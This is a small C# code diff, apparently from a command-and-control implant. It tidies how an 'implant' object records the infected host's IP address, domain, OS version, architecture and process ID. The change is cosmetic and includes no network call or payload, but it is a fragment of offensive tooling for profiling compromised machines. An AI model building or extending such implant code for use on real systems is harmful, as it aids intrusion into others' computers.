@@ -24,8 +24,8 @@ namespace SaltedCaramel
             // Necessary because the host may have more than one interface
             implant.ip = Dns.GetHostEntry(implant.host)
                 .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
-            implant.domain = System.Environment.UserDomainName;
-            implant.os = System.Environment.OSVersion.VersionString;
+            implant.domain = Environment.UserDomainName;
+            implant.os = Environment.OSVersion.VersionString;
             implant.architecture = "x64";
             using (Process proc = Process.GetCurrentProcess())
                 implant.pid = proc.Id;
